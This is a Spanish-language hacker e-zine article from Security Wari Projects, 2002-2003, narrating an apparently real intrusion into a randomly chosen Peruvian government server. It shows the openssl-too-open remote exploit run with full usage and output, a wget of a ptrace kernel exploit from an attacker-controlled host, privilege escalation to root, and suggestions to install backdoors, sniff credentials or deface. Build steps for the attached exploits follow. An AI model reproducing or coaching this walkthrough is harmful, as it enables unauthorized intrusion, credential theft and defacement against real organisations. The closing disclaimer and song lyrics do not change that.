   ______   ______   ______   ______   ______   ______   ______   ______
  |  ____| |  ____| |  ____| |  ____| |  ____| |  ____| |  ____| |  ____|      
__| |______| |______| |______| |______| |______| |______| |______| |________
----------------------------------------------------------------------------
Codigo     Titulo                                                Autor
SWP04-09   Instrusiones - Caso real                              Sicario   
----------------------------------------------------------------------------



Tabla de contenido.
1. Introduccion.
2. Intrusion.
3. Conclusiones.

1. Introduccion.
   ------------

   Suelo  tener  sesiones  de  chat  en el IRC, para  compartir informacion,
responder  y  realizar  preguntas   sobre  Hacking,  seguridad,  Linux, SWP.
Entre  los muchos  comentarios, lo  nuevo,  conceptos,  conocimientos, ideas
erradas y deseos  de conocer,  existe  entre  los  Newbies  aquel  deseo  de
llegar  a  penetrar  servidores. Deseo  que no  es ajeno a  nosotros, ya que
alguna vez tuvimos el mismo deseo, aun hoy en dia, ingresar a alguna red nos
quita el sue~o, nos  emociona,  todos esos sentimientos  mezclados  que solo
aquellos  que han experimentado el ingresar a un servidor entenderan.
   Ingresar  a  un  servidor no  es tan  complicado,  como se podria pensar,
todos alguna  vez pasamos  por lo mismo, sin saber por donde empezar. Quiero
que a traves de este  articulo pierdan  el temor y ademas  comprendan que el
ingreso a un servidor NO es el maximo objetivo que deben perseguir, ni mucho
menos creer que eso los convertira en Hackers.

2. Intrusion. 
   -----------

-  Miercoles 6 de Agosto - 12:30am
   Es una de las tantas noches que no puedo dormir. Suelo pasar muchas horas
frente a este monitor. Por algunas horas converso  con algunos  miembros  de
SWP y me pierdo en  Internet. Termino aburriendome, lo que me lleva a buscar
alguna red y tratar de ingresar en ella.
  A donde ingresar? Ejecuto Mozilla e ingreso a www.netcraft.com, realizo una
busqueda de todos los hosts *.gob.pe, elijo uno al azar  y lo analizo.
  Todo  aquel  que  tenga  experiencia en Hacking  sabe muy bien que no debe
intentar  penetrar  otras  redes  de  forma directa, por lo tanto se usa una
tecnica denominada "condon", que consiste en conectarte a otros hosts, donde
tenemos  control  y  desde  ahi  atacar nuestro  objetivo, de tal manera que
podamos  ocultar   nuestra  direccion y dificultar el rastreo del origen del
ataque.
  Para  estos fines  poseo una variedad  de  servidores, uso uno donde tengo
instalado el Nessus, ejecuto  el server, luego  realizo  una conexion remota
desde mi PC. Al  usar esta  herramienta puedo obtener informacion suficiente
para saber que servicios tiene corriendo mi objetivo, de  esta manera  saber
por donde comenzar la intrusion.
  Previamente ya se que dicho server esta usando Red Hat, por la informacion
que me dio el NetCraft, realizo un Telnet y obtengo la version, Red Hat 7.3.
  El reporte de Nessus me informa que esta corriendo Apache Web Server y una
version de OpenSSL que  es vulnerable a ser  explotado remotamente por medio
de un KEY_ARG overflow para obtener una shell.
  Hasta este punto  lo  que   hice  es  recabar  informacion, que me ayudara
a  conocer  el   objetivo,  determinar  cuales  son  los posibles huecos  de
seguridad a ser explotados y usarlos para ingresar.
  Cual  sera el  siguiente paso ? Pues a explotar remotamente el Apache  Web
Server, realizo  conexiones por medio de puertas traseras a otros servidores
bajo mi control, donde tengo los exploits necesarios.
  Para  explotar  la  vulnerabilidad remota del OpenSSL, usaremos un exploit
programado    por  Solar Eclipse,  para  versiones   del   OpenSSL 0.9.6d  y
anteriores:

  openssl-too-open : OpenSSL remote exploit
  by Solar Eclipse <solareclipse@phreedom.org>

----------------------------------------------------------------------------
# Como usar el exploit? Solo lo ejecutamos sin parametros, para  obtener  la
# ayuda. Adicionalmente, este exploit posee una herramienta, openssl-scanner
# para realizar scaneos de hosts y comprobar si son vulnerables.
----------------------------------------------------------------------------

[root@mailserver openssl-too-open]# ./openssl-too-open
: openssl-too-open : OpenSSL remote exploit
  by Solar Eclipse <solareclipse@phreedom.org>

Usage: ./openssl-too-open [options] <host>
  -a <arch>          target architecture (default is 0x00)
  -p <port>          SSL port (default is 443)
  -c <N>             open N apache connections before sending the shellcode (default is 30)
  -m <N>             maximum number of open connections (default is 50)
  -v                 verbose mode

Supported architectures:
	0x00 - Gentoo (apache-1.3.24-r2)
	0x01 - Debian Woody GNU/Linux 3.0 (apache-1.326-1)
	0x02 - Slackware 7.0 (apache-1.3.26)
	0x03 - Slackware 8.1-stable (apache-1.3.26)
	0x04 - RedHat Linux 6.0 (apache-1.3.6-7)
	0x05 - RedHat Linux 6.1 (apache-1.3.9-4)
	0x06 - RedHat Linux 6.2 (apache-1.3.12-2)
	0x07 - RedHat Linux 7.0 (apache-1.3.12-25)
	0x08 - RedHat Linux 7.1 (apache-1.3.19-5)
	0x09 - RedHat Linux 7.2 (apache-1.3.20-16)
	0x0a - Redhat Linux 7.2 (apache-1.3.26 w/PHP)
	0x0b - RedHat Linux 7.3 (apache-1.3.23-11)
	0x0c - SuSE Linux 7.0 (apache-1.3.12)
	0x0d - SuSE Linux 7.1 (apache-1.3.17)
	0x0e - SuSE Linux 7.2 (apache-1.3.19)
	0x0f - SuSE Linux 7.3 (apache-1.3.20)
	0x10 - SuSE Linux 8.0 (apache-1.3.23-137)
	0x11 - SuSE Linux 8.0 (apache-1.3.23)
	0x12 - Mandrake Linux 7.1 (apache-1.3.14-2)
	0x13 - Mandrake Linux 8.0 (apache-1.3.19-3)
	0x14 - Mandrake Linux 8.1 (apache-1.3.20-3)
	0x15 - Mandrake Linux 8.2 (apache-1.3.23-4)

[root@mailserver openssl-too-open]# ./openssl-too-open -a 0x0b www.*.gob.pe
: openssl-too-open : OpenSSL remote exploit
  by Solar Eclipse <solareclipse@phreedom.org>

: Opening 30 connections
  Establishing SSL connections

: Using the OpenSSL info leak to retrieve the addresses
  ssl0 : 0x8e0ba58
  ssl1 : 0x8e0ba58
  ssl2 : 0x8e0ba58

: Sending shellcode
ciphers: 0x8e0ba58   start_addr: 0x8e0b998   SHELLCODE_OFS: 208
  Execution of stage1 shellcode succeeded, sending stage2
  Spawning shell...

bash: no job control in this shell
readline: warning: rl_prep_terminal: cannot get terminal settingsbash-2.05a$
readline: warning: rl_prep_terminal: cannot get terminal settingsbash-2.05a$
Linux www.*.gob.pe 2.4.18-3 #1 Thu Apr 18 07:37:53 EDT 2002 i686 unknown
uid=48(apache) gid=48(apache) groups=48(apache) 
  3:10am  up 19:37,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
root     tty1     -                Tue 8am 16:57m  0.07s  0.02s  -bash

----------------------------------------------------------------------------
# Ya tenemos el acceso a una shell mediante el Apache, pero luego de obtener
# acceso el paso siguiente es obtener  el root del sistema. Puede ser que en
# algunos sistemas encuentres agujeros explotables que te permitan conseguir
# el nivel de root directamente, este  no  es el caso, asi que tendremos que
# buscar la forma de conseguirlo.
# Esta  misma version  de Red Hat es vulnerables a ser explotado localmente,
# Pero primero comprobamos la actividad del root.
----------------------------------------------------------------------------

w
  3:22am  up 19:48,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
root     tty1     -                Tue 8am 17:09m  0.07s  0.02s  -bash

----------------------------------------------------------------------------
# El Sys Admin debe  estar dormido, por eso duermo muy poco, nos perdemos de
# muchas cosas al hacerlo.
# No  hay  actividad  del root  por 17:09 horas, asi  que  podemos  trabajar
# tranquilamente.
# El exploit local fue  programado por Wojciech Purczynski <cliph@isec.pl> y
# como dice parte de los comentarios del software:
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*
 * IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY
 * 
# Cosa que estamos realizando nosotros, SOLO con propositos educativos.
# Descargo  el exploit local para el Kernel desde la maquina bajo mi control
# al directorio /tmp, previamente  el  exploit fue  compilado, por  lo tanto
# solo tendre que ejecutarlo.
----------------------------------------------------------------------------

readline: warning: rl_prep_terminal: cannot get terminal settingsbash-2.05a$
cd /tmp 
readline: warning: rl_prep_terminal: cannot get terminal settingsbash-2.05a$
wget http://*.*.*.*/ptrace 
--03:42:54--  http://*.*.*.*/ptrace
           => `ptrace'
Connecting to *.*.*.*:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14,203 [text/plain]

    0K .......... ...                                        100%   11.14 KB/s

03:43:56 (11.14 KB/s) - `ptrace' saved [14203/14203]

readline: warning: rl_prep_terminal: cannot get terminal settingsbash-2.05a$
ls ptrace
ptrace
readline: warning: rl_prep_terminal: cannot get terminal settingsbash-2.05a$
./ptrace 
bash: ./ptrace: Permission denied

----------------------------------------------------------------------------
# Faltan los permisos de ejecucion!
----------------------------------------------------------------------------

readline: warning: rl_prep_terminal: cannot get terminal settingsbash-2.05a$
chmod 777 ptrace 
readline: warning: rl_prep_terminal: cannot get terminal settingsbash-2.05a$
./ptrace 
[+] Attached to 5459
[+] Signal caught
[+] Shellcode placed at 0x4000fd1d
[+] Now wait for suid shell...

----------------------------------------------------------------------------
# Con este exploit tenemos nivel de root, vamos a combrobarlo.
----------------------------------------------------------------------------

id
uid=0(root) gid=0(root)
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 

----------------------------------------------------------------------------
# Y ahora? Podemos hacer muchas cosas, como  por ejemplo  instalar backdoors
# para  poder  ingresar  sin dejar registros, podemos  instalar un Sniffer y
# capturar la  informacion  que  circula por  la red  para obtener claves de
# otros servidores, cuentas  de correo  y  mucho mas. Pero  podemos tan solo
# realizar un defaced.
----------------------------------------------------------------------------

3. Conclusiones.
   ------------ 

   Como pudieron  observar, ingresar  a un server no es nada dificil, espero
que esto los  haya ayudado. Es  sorprendente  la  cantidad de servidores mal
configurados, sin actualizar, sin  ninguna  medida de seguridad, que podemos
encontrar si realizamos busquedas en Internet. Cuando redes  tan vulnerables
son atacadas, es muy facil  criticar la actitud de  los Script Kiddies, pero
en realidad la culpa la  tienen las personas encargadas, los administradores
de red. Informacion  existe en  Internet, herramientas que ayuden a realizar
exploraciones  y buscar  vulnerabilidades  para crackeos en redes, eso no va
a cambiar, no tenemos  el control sobre eso, pero  como  responsables por la
seguridad de una red, pueden hacer algo, simplemente  no esperen  a que sean
victimas de un ataque para tomar medidas con respecto a la seguridad. 
   Tampoco  pretendo  fomentar a los  Script Kiddies  ni  a  los  Newbies  a
realizar intrusiones, cada  ser es  responsable por si mismo de usar  lo que
sabe de la manera que mas le de placer. 
   Los exploits utilizados para esta demostracion, los encontraran  adjuntos
a este articulo.
Exploit 1: openssl-too-open.tar.gz
   Descomprimir y compilar:
        [root@localhost exploits]# tar -zxvf openssl-too-open.tar.gz
	openssl-too-open/
	openssl-too-open/Makefile
	openssl-too-open/main.h
	openssl-too-open/ssl2.c
	openssl-too-open/ssl2.h
	openssl-too-open/main.c
	openssl-too-open/linux-x86.c
	openssl-too-open/README
	openssl-too-open/scanner.c
	
	[root@gnr exploits]# cd openssl-too-open
	[root@localhost openssl-too-open]# make
	gcc -g -lcrypto -o openssl-too-open main.o ssl2.o linux-x86.o
	gcc -g -lcrypto -o openssl-scanner scanner.o ssl2.o
	[root@gnr openssl-too-open]#
	

Exploit 2: ptrace-kmod.c
   Compilarlo:
        [root@localhost exploits]# gcc ptrace-kmod.c -o ptrace

Comentarios, sugerencias y/o intercambio  de informacion comunicarce con SWP
al email: 
		swp@swp-zone.org
Este y otros articulos los puede encontrar en:
		www.swp-zone.org
		www.sicario.org

                                   She's got a smile that it seems to me
                                   reminds me of childhood memories
                                   where evrything
                                   was as fresh as the bright blue sky
                                   now and then when I see her face
                                   she takes me away to that special place
                                   and if I stared too long
                                   I'd probably break down and cry
                                   Sweet child o'mine
                                   Sweet love of mine
                                   She's got eyes of the bluest sky
                                   as if they thought of rain
                                   I hate to look into those eyes
                                   and see an ounce of pain
                                   her hair reminds me of a warm safe place
                                   where as a child I'd hide
                                   and pray for the thunder
                                   and the rain
                                   to quietly pass me by
                                   Sweet child o'mine
                                   Sweet love of mine
                                   Where do we go
                                   Where do we go now
                                   Where do we go
                                   Sweet child o'mine
                                                         Sweet child o'mine
                                                   Appetite for destruction
                                                             Guns And Roses



   ______   ______   ______   ______   ______   ______   ______   ______
  |  ____| |  ____| |  ____| |  ____| |  ____| |  ____| |  ____| |  ____|      
__| |______| |______| |______| |______| |______| |______| |______| |______
--------------------------------------------------------------------------

                      --                             --
			 Security Wari Projects / SWP  |
		      (c) Todos los Derechos Reservados
		     |     PERU / 2002 - 2003           
                      --                              --
